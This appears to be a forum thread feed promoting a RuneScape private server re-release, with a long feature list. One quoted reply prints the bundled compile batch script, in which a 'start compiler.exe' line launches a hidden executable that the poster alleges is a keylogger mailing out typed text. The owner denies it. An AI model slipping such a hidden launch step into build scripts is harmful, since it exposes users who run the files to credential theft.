channel.title: [508] ScapeRune - Re-Release! [508] (1k Dls)~{New Graphics}~
channel.description:
[b][size=5] ScapeRune! [/size][/b]
Server Files - * Client used - *
The version the original releaser was 17.9 so i made 18.0 and fixed many bugs and glitches. I fixed: -When you tele home using ::home objects wouldnt appear -in minigames(nazi zombies) zombies would not appear when etering -many objects were nulls (many objects still need fixing) -improved veng and barrage -improved the air bending spells -fixed 1 of the 2 pk shops -made a way to get home from shops -fixed summoning -fixed dfs (NOTE: uncharged is held like a pot so still need to fix that) -there was one cause of null which was fixed and a couple more things like bot spammers and such
These are his old features and some pictures which he took and some i did: •Stable •Anti-Flood •Impossible to go offline •Custom models •PK Points System •PK Point Shop •Shops •NPC Dialogue •Rep System (Shows skull) •Donator rank •Custom item specials •Log in interface •NPC VS. PLAYER Combat •PLAYER VS. PLAYER Combat (It’s 150% like RuneScape. Even better now. ;)) •All buttons handled •Server Console •Player Saving •Character Design •Custom gfx •Fletching •All ancient magic works (no farcast) •All ancient magic works (with farcast) •Some normal magic •Veng •Veng other •Stat view •Ready to add custom anims. •Jad Minigame (firecape, other drag items) •Mithril PK (get bender swords, other drag items) •Has a PK economy (Meaning you PK for items, pk points, and cash) •Basic commands •Custom teleports •Avatar bending skills •Bounty Hunter •Edge 1v1 •Mage Bank •Varrock Team PK •Dragon Claws 4 hit spec •NPC Cave (get npc drops here) •Dragon Claws operate •Dragon fire shield spec (on operate) •Special power of the dragon claws move (after beating jad minigame) •Working AFK. (Timer set at 1 minute, 30 seconds) •Skillcape emotes •Normal emotes •Air guitar uses PK Points and does an electric music move. •Weapon sounds •Special attack sounds •Custom weapons sounds •Duel Arena (with staking) •Easy to start out •Clan chat (Only 50%) •Administrator + Moderator crowns •PVP Drops •Only Admin+ can use ::item •Dharok effect •Verac effect •God wars dungeon (get godswords from here) •KBD with magic + melee (get d claws from here) •Starter package (only can get one per user) •One connection per IP •Range Void Effects •Melee Void Effects •Mage Void Effects •D Bow Effects •Working Range Projectiles •Working Magic Projectiles •Fletching •Guthan Effect •Nazi Zombie Minigame •Summoning •Almost 100% all magics
[IMG]http://i50.tinypic.com/254zd00.png[/img] [IMG]http://i45.tinypic.com/ojpbhu.png[/img] [IMG]http://i47.tinypic.com/bfn7zm.png[/img] [IMG]http://i47.tinypic.com/15zpd1j.png[/img] [IMG]http://i50.tinypic.com/s442gl.png[/img] [IMG]http://i46.tinypic.com/33faupy.png[/img] [IMG]http://i45.tinypic.com/ej9qa.png[/img] [IMG]http://i48.tinypic.com/zj6jgk.png[/img] [IMG]http://i50.tinypic.com/x2joea.png[/img] [IMG]http://i47.tinypic.com/2usjupj.png[/img] [IMG]http://i46.tinypic.com/2utq9tg.png[/img] [IMG]http://i49.tinypic.com/c5hzb.png[/img] [IMG]http://i49.tinypic.com/34ec4np.png[/img]

item.title: [508] ScapeRune - Re-Release! [508] (1k Dls)~{New Graphics}~
item.dc:creator: @xx_matty_xx Justin Bieber
item.description:
@xx_matty_xx wrote:

[quote=“TOMSCAPE BETA, post:14, topic:332137”]Just out of curiosity, why is there a EXE file named compile with the description ‘sjfsldfjadgiodfgfdshg’ that is also a hidden file. That i believe also sends what you type to an email of somesort.

EDIT: This isn’t safe, reported.

@echo off @title ScapeRune Server: Compile start compiler.exe cd ../java "C:\Program Files\Java\jdk1.6.0_17\bin\javac.exe" -cp . -d ../class/ ./net/com/canownueasy/*.java pause

orly[/quote]
Ah, the old compiler.exe…

Read full topic

item.dc:creator: @ScapeRuneOwner ScapeRuneOwner
item.description:
@ScapeRuneOwner wrote:

Its 100% safe actually, don’t lie about my files.

item.title: [508] ScapeRune - Re-Release! [508] (1k Dls)~{New Graphics}~
item.dc:creator: @ScapeRuneOwner ScapeRuneOwner
item.description:
@ScapeRuneOwner wrote:

[size=5] ScapeRune! [/size]

Server Files - *
Client used - *

The version the original releaser was 17.9 so i made 18.0 and fixed many bugs and glitches.
I fixed:
-When you tele home using ::home objects wouldnt appear
-in minigames(nazi zombies) zombies would not appear when etering
-many objects were nulls (many objects still need fixing)
-improved veng and barrage
-improved the air bending spells
-fixed 1 of the 2 pk shops
-made a way to get home from shops
-fixed summoning
-fixed dfs (NOTE: uncharged is held like a pot so still need to fix that)
-there was one cause of null which was fixed
and a couple more things like bot spammers and such

These are his old features and some pictures which he took and some i did:
•Stable
•Anti-Flood
•Impossible to go offline
•Custom models
•PK Points System
•PK Point Shop
•Shops
•NPC Dialogue
•Rep System (Shows skull)
•Donator rank
•Custom item specials
•Log in interface
•NPC VS. PLAYER Combat
•PLAYER VS. PLAYER Combat (It’s 150% like RuneScape. Even better now. ;))
•All buttons handled
•Server Console
•Player Saving
•Character Design
•Custom gfx
•Fletching
•All ancient magic works (no farcast)
•All ancient magic works (with farcast)
•Some normal magic
•Veng
•Veng other
•Stat view
•Ready to add custom anims.
•Jad Minigame (firecape, other drag items)
•Mithril PK (get bender swords, other drag items)
•Has a PK economy (Meaning you PK for items, pk points, and cash)
•Basic commands
•Custom teleports
•Avatar bending skills
•Bounty Hunter
•Edge 1v1
•Mage Bank
•Varrock Team PK
•Dragon Claws 4 hit spec
•NPC Cave (get npc drops here)
•Dragon Claws operate
•Dragon fire shield spec (on operate)
•Special power of the dragon claws move (after beating jad minigame)
•Working AFK. (Timer set at 1 minute, 30 seconds)
•Skillcape emotes
•Normal emotes
•Air guitar uses PK Points and does an electric music move.
•Weapon sounds
•Special attack sounds
•Custom weapons sounds
•Duel Arena (with staking)
•Easy to start out
•Clan chat (Only 50%)
•Administrator + Moderator crowns
•PVP Drops
•Only Admin+ can use ::item
•Dharok effect
•Verac effect
•God wars dungeon (get godswords from here)
•KBD with magic + melee (get d claws from here)
•Starter package (only can get one per user)
•One connection per IP
•Range Void Effects
•Melee Void Effects
•Mage Void Effects
•D Bow Effects
•Working Range Projectiles
•Working Magic Projectiles
•Fletching
•Guthan Effect
•Nazi Zombie Minigame
•Summoning
•Almost 100% all magics
